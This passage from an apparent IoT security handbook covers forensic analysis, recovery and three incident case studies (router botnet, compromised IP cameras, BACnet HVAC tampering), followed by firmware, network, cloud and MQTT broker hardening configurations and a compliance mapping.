4. Collect network infrastructure logs — firewall, DNS, DHCP, NAC.
5. Hash and timestamp all evidence per forensic chain-of-custody requirements.

**Phase 3 — Analysis:**

1. Analyze the flash dump — compare against a known-good firmware image (from vendor or pre-incident backup). Identify modified files, added binaries, changed configurations.
2. Analyze the RAM dump — search for decrypted credentials, C2 communication buffers, injected code.
3. Analyze network captures — reconstruct the attack timeline from packet-level evidence. Identify initial access vector, lateral movement, data exfiltration, C2 communication pattern.
4. Cross-correlate device evidence with cloud logs to establish the full kill chain.

**Phase 4 — Recovery:**

1. Reflash the device with verified clean firmware (from vendor, hash-verified against vendor's published checksum).
2. Rotate all credentials: device certificates, cloud API keys, Wi-Fi PSK (if the device had access), any credentials the device stored.
3. Update network access policies: tighten ACLs, implement MUD profiles if not already in place, add detection rules for the observed attack pattern.
4. If the device model is EOL with no vendor support, replace it.

### 9.6 Case studies

**Case study 1 — Mirai variant takedown (2017, ISP-coordinated).**

A mid-size European ISP detected anomalous outbound traffic from its residential CPE fleet. NetFlow analysis revealed 23,000 TR-069-managed routers (Zyxel VMG1312) generating sustained UDP flood traffic toward a gaming infrastructure provider. Investigation: the routers had been compromised via CVE-2017-18368 (Zyxel command injection in the Remote System Log forwarding feature, accessible via the LAN-side web interface without authentication). The attacker exploited the vulnerability to download a MIPS Mirai variant, which persisted via crontab. Containment: the ISP pushed an ACL via TR-069 `SetParameterValues` to block outbound UDP to non-essential ports across the affected fleet. The ACL was applied within 4 hours via the existing ACS infrastructure. Eradication: the ISP pushed a firmware update via TR-069 `Download` RPC to all affected devices, patching CVE-2017-18368 and removing the malware persistence. Recovery: 98% of affected devices were remediated within 72 hours without customer truck rolls. The remaining 2% required manual intervention (devices had been modified to block TR-069 communication by the malware's iptables rules).

**Case study 2 — Compromised IP camera network in corporate environment (2023).**

A financial services firm's SOC detected Armis alerts indicating 47 Hikvision IP cameras (model DS-2CD2143G0-I) exhibiting anomalous behavior: DNS queries to domains not in the cameras' MUD profile, and outbound HTTPS connections to IP addresses geolocated to Eastern Europe. Investigation: firmware analysis revealed the cameras were running firmware version 5.5.800 build 210628, affected by CVE-2021-36260 (CVSS 9.8, CWE-77 — command injection via a crafted HTTP request to the `/SDK/webLanguage` endpoint). The attacker had exploited the vulnerability to install a reverse shell that connected to a C2 server over HTTPS port 443, tunneled through the firm's proxy. RAM forensics (via JTAG on a representative camera) revealed the malware was a custom ELF binary that collected internal network topology information, DNS resolution results, and ARP table contents — consistent with reconnaissance for lateral movement. Containment: NAC quarantine via ISE CoA for all 47 cameras within 15 minutes of SOC triage. Recovery: firmware updated to 5.7.1 build 221101 (patched version). Certificates rotated. Network segmentation hardened to enforce camera-to-NVR-only traffic with deny-all egress policy. New Sigma rules deployed for the observed C2 behavioral pattern.

**Case study 3 — Smart building BACnet exploitation (2024).**

A commercial building management company discovered unauthorized modification of HVAC setpoints in a 40-story office building. Temperature in server rooms had been raised to 38°C (100°F), triggering thermal shutdowns of rack-mounted equipment. Investigation: the building automation system (Honeywell Tridium Niagara AX) exposed a BACnet/IP interface on UDP port 47808 without authentication (default configuration). The attacker, originating from a compromised IoT device on the building's guest Wi-Fi network, used BACnet discovery (`who-is` broadcast) to enumerate all BACnet objects, then issued `write-property` commands to modify the temperature setpoints on HVAC controller objects. The guest Wi-Fi VLAN was not isolated from the building automation VLAN — a flat network topology allowed direct BACnet communication. Containment: immediate VLAN segmentation separating guest Wi-Fi, building automation, and corporate networks. BACnet communication restricted to the building management workstation's IP only. Recovery: setpoints restored. BACnet authentication enabled (BACnet Secure Connect, per ASHRAE Addendum 135-2016-bj). Network segmentation maintained with explicit ACLs permitting only authorized BMS workstations to communicate on UDP 47808. Cross-reference: Domain 20 for RF/wireless aspects, Domain 28A §3 for BACnet protocol security.

---

## 10. IoT device hardening

### 10.1 Firmware hardening

**Secure boot with MCUboot:**

MCUboot is the reference secure bootloader for Zephyr RTOS and Apache Mynewt, widely deployed on ARM Cortex-M IoT devices. It provides image signing, upgrade orchestration, and rollback protection.

```bash
# Generate signing keys (ECDSA-P256 — MCUboot default)
python3 scripts/imgtool.py keygen -k signing_key.pem -t ecdsa-p256

# Sign a firmware image for MCUboot (slot 0 primary, slot 1 secondary)
python3 scripts/imgtool.py sign \
    --key signing_key.pem \
    --header-size 0x200 \
    --align 8 \
    --version 2.1.0 \
    --slot-size 0x60000 \
    --pad-header \
    zephyr.bin signed_zephyr.bin

# MCUboot configuration (prj.conf for Zephyr)
# CONFIG_BOOT_SIGNATURE_TYPE_ECDSA_P256=y
# CONFIG_BOOT_SIGNATURE_KEY_FILE="signing_key.pem"
# CONFIG_BOOT_VALIDATE_SLOT0=y           # validate primary slot on every boot
# CONFIG_BOOT_UPGRADE_ONLY=n             # allow rollback (swap-based upgrade)
# CONFIG_BOOT_MAX_IMG_SECTORS=256
# CONFIG_MCUBOOT_DOWNGRADE_PREVENTION=y  # anti-rollback via version counter
```

MCUboot's swap-based upgrade writes the new image to the secondary slot, validates its signature, then atomically swaps the primary and secondary slots. If the new image fails to mark itself as "confirmed" within a configurable timeout (via `boot_set_confirmed()`), MCUboot reverts to the previous image on next boot — providing automatic rollback on failed updates.

**Read-only root filesystem:**

A read-only root filesystem prevents persistent modification by malware. Writable data (configuration, logs) is isolated to a separate partition with strict size limits:

```bash
# Linux kernel command line — mount root as read-only
root=/dev/mmcblk0p2 rootfstype=squashfs ro

# fstab configuration for writable overlay
# /dev/mmcblk0p3 is a small (8–16MB) writable partition for configuration
tmpfs           /tmp        tmpfs   nosuid,nodev,noexec,size=4M    0 0
/dev/mmcblk0p3  /data       ext4    nosuid,nodev,noexec,size=16M   0 0

# Bind-mount writable paths into the read-only root
mount --bind /data/etc_overlay /etc/config
mount --bind /data/log /var/log
```

SquashFS (read-only, compressed) for the root filesystem combined with an overlayfs or bind-mount strategy for writable data achieves two goals: firmware integrity (the root filesystem cannot be modified by malware — it is physically read-only in the squashfs image) and persistence prevention (malware that writes to `/tmp` loses persistence on reboot since tmpfs is volatile).

**Binary hardening for embedded Linux:**

IoT firmware binaries are frequently compiled without standard exploitation mitigations. Enforce these in the build system:

```bash
# Verify protections on extracted firmware binaries with checksec
checksec --file=extracted/usr/bin/httpd
# Desired output:
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

# GCC flags for embedded firmware hardening
CFLAGS += -fstack-protector-strong        # stack canaries
CFLAGS += -D_FORTIFY_SOURCE=2             # buffer overflow detection (glibc)
CFLAGS += -fPIE                           # position-independent executable
LDFLAGS += -pie                           # link as PIE
LDFLAGS += -Wl,-z,relro,-z,now           # full RELRO (GOT read-only after relocation)
LDFLAGS += -Wl,-z,noexecstack            # non-executable stack

# For Buildroot-based firmware builds (defconfig):
# BR2_TARGET_OPTIMIZATION="-O2 -fstack-protector-strong -D_FORTIFY_SOURCE=2"
# BR2_SSP_STRONG=y
# BR2_RELRO_FULL=y
# BR2_PIE=y
```

**Credential management on constrained devices:**

Never store credentials in plaintext on the filesystem. For devices with a secure element (ATECC608B, STSAFE-A110, Infineon OPTIGA Trust):

```c
/* Store TLS private key in ATECC608B secure element — key never leaves the chip */
/* Microchip CryptoAuthLib API */
#include "cryptoauthlib.h"

ATCA_STATUS status;
uint8_t pubkey[64];

/* Generate ECC-P256 key pair — private key stored internally in slot 0 */
status = atcab_genkey(0, pubkey);   /* slot 0, public key returned */
/* Sign with the stored private key (private key never exposed) */
uint8_t signature[64];
uint8_t digest[32];  /* SHA-256 of data to sign */
status = atcab_sign(0, digest, signature);
/* TLS library configured to use ATECC608B as the private key backend */
```

For devices without a secure element, derive credentials from a device-unique hardware identifier (SoC UID, eFuse-stored key) using a KDF (HKDF per RFC 5869). Never use the same credential across multiple devices.

### 10.2 Network hardening

**VLAN segmentation reference architecture:**

```
VLAN 10 — Corporate LAN (workstations, servers)
VLAN 20 — Management (switches, APs, UPS, BMC/IPMI)
VLAN 30 — Guest Wi-Fi (internet-only, no internal access)
VLAN 50 — IoT Sensors (temperature, humidity, occupancy)
VLAN 51 — IoT Cameras (IP cameras, NVR)
VLAN 52 — Building Automation (BACnet, HVAC, lighting)
VLAN 60 — Medical IoT (patient monitors, infusion pumps) — if applicable

Inter-VLAN policy (firewall/ACL):
  VLAN 50 → Internet: ALLOW only vendor cloud IPs on HTTPS (443)
  VLAN 50 → VLAN 10: DENY ALL
  VLAN 50 → VLAN 51: DENY ALL
  VLAN 51 → VLAN 10: ALLOW NVR → recording server on TCP 554 (RTSP) ONLY
  VLAN 51 → Internet: DENY ALL (cameras must not reach the internet directly)
  VLAN 52 → VLAN 10: ALLOW BMS workstation IP on UDP 47808 (BACnet) ONLY
  VLAN 52 → Internet: DENY ALL
  VLAN 60 → VLAN 10: ALLOW clinical workstation IPs on specific ports ONLY
```

**MUD enforcement (operational deployment):**

```bash
# osMUD on OpenWrt — install and configure
opkg update && opkg install osmud

# Configure /etc/osmud/osmud.conf
# mud_manager_url = "https://mud.example.com"
# dhcp_lease_file = "/tmp/dhcp.leases"
# acl_type = "iptables"

# The MUD controller:
# 1. Monitors DHCP leases for MUD URL options (option 161)
# 2. Fetches the MUD file from the vendor's URL
# 3. Translates the MUD ACL into iptables rules
# 4. Applies per-device ACLs automatically
# 5. Updates rules when the MUD file is refreshed (cache-validity field)

systemctl enable osmud && systemctl start osmud
```

**Mutual TLS for IoT device-to-cloud communication:**

```bash
# Generate device certificate (during manufacturing provisioning)
# CA key and cert are managed by the vendor's PKI
openssl req -new -key device_key.pem -out device.csr \
    -subj "/CN=device-SERIAL123/O=VendorCo/OU=IoT"

openssl x509 -req -in device.csr -CA vendor_ca.crt -CAkey vendor_ca.key \
    -CAcreateserial -out device_cert.pem -days 3650 \
    -extfile <(printf "subjectAltName=URI:urn:dev:ops:VendorCo-SmartSensor-SERIAL123")

# MQTT broker (Mosquitto) — enforce mutual TLS
# mosquitto.conf
# listener 8883
# cafile /etc/mosquitto/ca_certificates/vendor_ca.crt
# certfile /etc/mosquitto/certs/broker.crt
# keyfile /etc/mosquitto/certs/broker.key
# require_certificate true
# use_identity_as_username true      # CN from client cert becomes MQTT username
# tls_version tlsv1.2               # minimum TLS 1.2

# Device-side MQTT connection with client certificate
mosquitto_pub --cafile vendor_ca.crt \
    --cert device_cert.pem --key device_key.pem \
    -h mqtt.vendor.example.com -p 8883 \
    -t "devices/SERIAL123/telemetry" -m '{"temp":22.5}'
```

**DNS security for IoT VLANs:**

Force all IoT DNS traffic through a controlled resolver that provides sinkholing, logging, and rebinding protection:

```bash
# iptables — redirect all DNS from IoT VLAN to internal resolver
iptables -t nat -A PREROUTING -i vlan50 -p udp --dport 53 \
    -j DNAT --to-destination 10.10.1.53:53
iptables -t nat -A PREROUTING -i vlan50 -p tcp --dport 53 \
    -j DNAT --to-destination 10.10.1.53:53

# Block direct DNS to external resolvers (prevent DNS-over-HTTPS bypass)
iptables -A FORWARD -i vlan50 -p udp --dport 53 ! -d 10.10.1.53 -j DROP
iptables -A FORWARD -i vlan50 -p tcp --dport 53 ! -d 10.10.1.53 -j DROP
iptables -A FORWARD -i vlan50 -p tcp --dport 443 -d 1.1.1.1 -j DROP    # Cloudflare DoH
iptables -A FORWARD -i vlan50 -p tcp --dport 443 -d 8.8.8.8 -j DROP    # Google DoH

# Internal resolver configuration (Unbound) — enable DNS rebinding protection
# /etc/unbound/unbound.conf
# server:
#     private-address: 10.0.0.0/8
#     private-address: 172.16.0.0/12
#     private-address: 192.168.0.0/16
#     private-domain: "local"
#     local-zone: "10.in-addr.arpa." nodefault
#     # Reject responses that resolve external domains to private IPs (rebinding)
#     private-address: 10.0.0.0/8
#     unwanted-reply-threshold: 10000000
```

### 10.3 Cloud backend hardening

**AWS IoT Core security configuration:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "iot:Connect",
      "Resource": "arn:aws:iot:us-east-1:ACCOUNT:client/${iot:Connection.Thing.ThingName}",
      "Condition": {
        "Bool": { "iot:Connection.Thing.IsAttached": "true" }
      }
    },
    {
      "Effect": "Allow",
      "Action": "iot:Publish",
      "Resource": "arn:aws:iot:us-east-1:ACCOUNT:topic/devices/${iot:Connection.Thing.ThingName}/telemetry"
    },
    {
      "Effect": "Allow",
      "Action": "iot:Subscribe",
      "Resource": "arn:aws:iot:us-east-1:ACCOUNT:topicfilter/devices/${iot:Connection.Thing.ThingName}/commands"
    },
    {
      "Effect": "Deny",
      "Action": "iot:Publish",
      "Resource": "arn:aws:iot:us-east-1:ACCOUNT:topic/$aws/things/*/shadow/update"
    }
  ]
}
```

Key principles: each device gets a unique X.509 certificate, the IoT policy scopes Publish/Subscribe to the device's own topic namespace using `${iot:Connection.Thing.ThingName}` policy variable, shadow update permissions are explicitly denied to devices (only the cloud application should update desired state), and the `IsAttached` condition ensures the certificate is attached to a registered Thing (preventing stolen certificates from connecting to arbitrary resources).

**Azure IoT Hub hardening:**

```bash
# Enforce SAS token expiry (short-lived tokens reduce credential theft window)
az iot hub policy create --hub-name MyIoTHub \
    --name device-connect \
    --permissions DeviceConnect \
    --resource-group MyRG

# Disable shared access policies where possible — prefer per-device X.509
az iot hub certificate create --hub-name MyIoTHub \
    --name vendor-root-ca \
    --path vendor_ca.crt \
    --resource-group MyRG

# Enable Defender for IoT (anomaly detection, vulnerability assessment)
az security iot-solution create \
    --solution-name IoTDefender \
    --resource-group MyRG \
    --iot-hubs "/subscriptions/SUB_ID/resourceGroups/MyRG/providers/Microsoft.Devices/IotHubs/MyIoTHub"
```

**MQTT broker hardening (Eclipse Mosquitto production configuration):**

```conf
# /etc/mosquitto/mosquitto.conf — production hardening

# Disable anonymous access
allow_anonymous false

# Require mutual TLS (X.509 client certificates)
listener 8883
cafile /etc/mosquitto/ca/vendor_ca_chain.crt
certfile /etc/mosquitto/certs/broker.crt
keyfile /etc/mosquitto/certs/broker.key
require_certificate true
use_identity_as_username true
tls_version tlsv1.2
ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384

# Disable insecure listeners (no plaintext MQTT on 1883)
# Do NOT add: listener 1883

# ACL file — restrict topic access per device
acl_file /etc/mosquitto/acl.conf

# Connection limits
max_connections 10000
max_inflight_messages 20
max_queued_messages 1000
message_size_limit 262144                # 256KB max message size

# Persistence and logging
persistence true
persistence_location /var/lib/mosquitto/
log_dest file /var/log/mosquitto/mosquitto.log
log_type error
log_type warning
log_type subscribe
log_type unsubscribe
connection_messages true
```

```conf
# /etc/mosquitto/acl.conf — per-device topic ACL
# Pattern substitution: %u = username (from client cert CN)

# Each device can only publish to its own telemetry topic
pattern write devices/%u/telemetry

# Each device can only subscribe to its own command topic
pattern read devices/%u/commands

# Deny access to $SYS topics (broker internals) for devices
topic deny $SYS/#

# Admin user (for management dashboard) — read-only on all topics
user admin-dashboard
topic read devices/#
topic read $SYS/#
```

### 10.4 Device lifecycle security

**Zero-touch provisioning (ZTP):**

Secure ZTP eliminates manual credential configuration by using a hardware-rooted identity (secure element or SoC-unique key) combined with a cloud-side device registry:

1. **Manufacturing.** During production, each device's secure element generates a key pair. The public key is registered in the vendor's cloud device registry (AWS IoT, Azure IoT Hub, or vendor PKI).
2. **First boot.** The device connects to the provisioning endpoint using its hardware-rooted identity. The cloud verifies the device's identity against the registry and issues a device certificate, configuration blob, and firmware update URL.
3. **Operational.** The device uses its provisioned certificate for all subsequent cloud communication. No manual credential entry. No shared secrets.

```bash
# AWS IoT Fleet Provisioning — claim-based provisioning
# The device uses a temporary "claim certificate" (embedded during manufacturing)
# to register itself and receive a permanent device certificate.

# 1. Create a provisioning template
aws iot create-provisioning-template \
    --template-name "SmartSensorProvisioning" \
    --template-body file://provisioning_template.json \
    --enabled

# provisioning_template.json:
# {
#   "Parameters": { "SerialNumber": { "Type": "String" } },
#   "Resources": {
#     "thing": {
#       "Type": "AWS::IoT::Thing",
#       "Properties": { "ThingName": {"Ref": "SerialNumber"} }
#     },
#     "certificate": {
#       "Type": "AWS::IoT::Certificate",
#       "Properties": { "CertificateId": {"Ref": "AWS::IoT::Certificate::Id"}, "Status": "Active" }
#     },
#     "policy": {
#       "Type": "AWS::IoT::Policy",
#       "Properties": { "PolicyName": "SmartSensorPolicy" }
#     }
#   }
# }

# 2. Device-side: use claim certificate to provision
# The device SDK calls CreateKeysAndCertificate, then RegisterThing
# with the serial number. AWS IoT returns a permanent certificate.
```

**OTA update security checklist:**

Before deploying any OTA update to a production fleet:

- [ ] Firmware image signed with the production signing key (HSM-protected).
- [ ] Image version number is strictly greater than the current deployed version.
- [ ] Anti-rollback counter in the image header matches the expected next value.
- [ ] Delta update (if used) applies cleanly to all firmware versions in the field.
- [ ] Staged rollout: deploy to 1% of fleet first, monitor for 24 hours, then 10%, then 100%.
- [ ] Rollback mechanism verified: if the new image fails to boot, the device reverts automatically.
- [ ] Cloud-side monitoring: track update success/failure rate, device health post-update.

**Secure decommissioning:**

When an IoT device reaches end-of-life or is transferred to a new owner:

1. **Revoke cloud credentials.** Delete the device's certificate from the cloud registry (AWS IoT: `delete-certificate`, Azure IoT Hub: `delete-device-identity`).
2. **Wipe device secrets.** Factory reset the device (clear secure element keys, erase writable partitions, reset eFuses if possible — though eFuses are typically irreversible).
3. **Remove from network.** Delete the device's NAC profile, MUD association, and monitoring rules.
4. **Audit trail.** Record the decommissioning in the asset management system with timestamp, reason, and operator identity.

For devices with hardware security elements (ATECC608B), invoke the secure element's key destruction command to ensure private keys cannot be recovered:

```c
/* ATECC608B — destroy keys in specified slots */
ATCA_STATUS status;
status = atcab_write_zone(ATCA_ZONE_DATA, 0, 0, 0, zeros_32, 32);  /* overwrite slot 0 */
status = atcab_lock_data_slot(0);  /* lock the slot to prevent re-provisioning */
```

### 10.5 Compliance mapping

IoT device hardening maps directly to regulatory requirements. The following cross-reference connects hardening controls to specific compliance mandates:

| Hardening Control | NIST IR 8259 Capability | ETSI EN 303 645 Provision |
|---|---|---|
| Secure boot (MCUboot) | Software Update | 5.7 Ensure software integrity |
| Read-only filesystem | Data Protection | 5.4 Securely store credentials |
| Binary hardening (NX, ASLR, canaries) | Software Update | 5.7 Ensure software integrity |
| Unique per-device credentials | Device Identification | 5.1 No universal default passwords |
| Secure element key storage | Data Protection | 5.4 Securely store credentials |
| VLAN segmentation | Logical Access Control | 5.5 Communicate securely |
| MUD enforcement | Cybersecurity State Awareness | 5.6 Minimize exposed attack surfaces |
| Mutual TLS | Data Protection | 5.5 Communicate securely |
| OTA with anti-rollback | Software Update | 5.3 Keep software updated |
| Zero-touch provisioning | Device Configuration | 5.4 Securely store credentials |
| Secure decommissioning | Device Configuration | 5.11 Make it easy for users to delete data |
| DNS security / rebinding protection | Logical Access Control | 5.6 Minimize exposed attack surfaces |

**PSA Certified Level 2 requirements** (relevant to ARM-based IoT):

PSA Certified Level 2 requires lab-based evaluation of: secure boot chain (hardware root of trust, signed bootloader, signed firmware), secure storage (isolated from non-secure world, protected against physical extraction), attestation (device can prove its identity and firmware integrity to a remote verifier), and secure update (signed OTA with anti-rollback). Devices targeting PSA Level 2 must implement ARM TrustZone with a Secure Processing Environment (SPE) and Non-Secure Processing Environment (NSPE) separation, typically using TF-M (Trusted Firmware-M) as the SPE runtime.

**SESIP Level 3 and above** require formal vulnerability analysis and penetration testing against the IoT platform's security functions, with documented attack potential calculations per ISO 15408 (Common Criteria) AVA_VAN methodology.

---

## 11. Cross-references

**To Chapter 28A:** The protocol-level vulnerabilities (Zigbee key sniffing, Z-Wave S0 weakness, BLE Mesh provisioning MitM, LoRaWAN ABP replay) described in Chapter 28A are the radio-layer attack surface. This chapter covers the device-level attack surface (hardware, firmware, update mechanism). A complete IoT security assessment (§6) addresses both layers.

**To Domain 12 (RE):** Firmware extraction (§2.1) and analysis (§2.2–2.6) use the tools and techniques from Domain 12 Chapter 12B (binwalk, Ghidra, JTAG/SWD, flash extraction). The binary vulnerability analysis (§2.6) follows the same methodology as Domain 26 Chapter 26A §4 (binary auditing).

**To Domain 17 (physical):** JTAG/SWD exploitation (§1.2) and fault-injection bypass of debug protection (§1.2 bypass) use the physical-security techniques from Domain 17 §3–4. SPI flash extraction (§1.3) uses the same hardware tools. ChipWhisperer voltage glitching (§1.2) extends the fault injection coverage from Domain 17 §4.

**To Domain 11 (malware):** IoT botnets (§4) are malware with propagation, persistence, and C2 — the same architectural components as general malware (Chapter 11A). Mirai's C2 protocol, Mozi's DHT-based C2, and Hajime's P2P architecture are IoT-specific instances of the C2 design patterns from Chapter 11A §5. The YARA rules (§2.8) and Sigma/Suricata rules (§4.2) complement the detection methodologies from Domain 11.

**To Domain 19 (supply chain):** Hard-coded credentials (§2.5) and unsigned firmware updates (§3.1) are supply-chain issues: the vulnerability is introduced during manufacturing and cannot be fixed by the end user. The mass TR-069 exploitation (§5.2) demonstrates how a supply-chain weakness in CPE firmware can affect millions of devices.

**To Domain 12B (firmware RE, from §8–§10):** Detection engineering (§8) extends the firmware YARA rules from §2.8 with variant-specific signatures (BotenaGo, HEH, Enemybot). IoT forensic acquisition (§9.1) uses the same JTAG/SWD and flash-extraction techniques from Domain 12 Chapter 12B but in an evidentiary context with chain-of-custody requirements. Firmware hardening (§10.1) references binary hardening flags (NX, PIE, RELRO, FORTIFY_SOURCE) that directly counter the exploitation techniques analyzed during firmware RE.

**To Domain 20 (RF/wireless, from §9):** The BACnet exploitation case study (§9.6 case study 3) involves building automation protocols that may traverse RF links. IoT forensics (§9.3) covers network-layer PCAP analysis for MQTT and CoAP — the protocol specifications and RF-layer aspects are in Chapter 28A and Domain 20 respectively.

**To Chapter 28A (IoT protocols, from §8–§10):** Detection engineering (§8) provides Sigma rules and network monitoring that complement the protocol-layer security coverage in Chapter 28A. IoT forensics (§9.3) covers MQTT and CoAP PCAP analysis at the application layer — the protocol specifications, framing, and radio-layer aspects are in Chapter 28A. Device hardening (§10.2–10.3) covers MQTT broker hardening and mutual TLS configuration that secures the transport for protocols described in Chapter 28A.
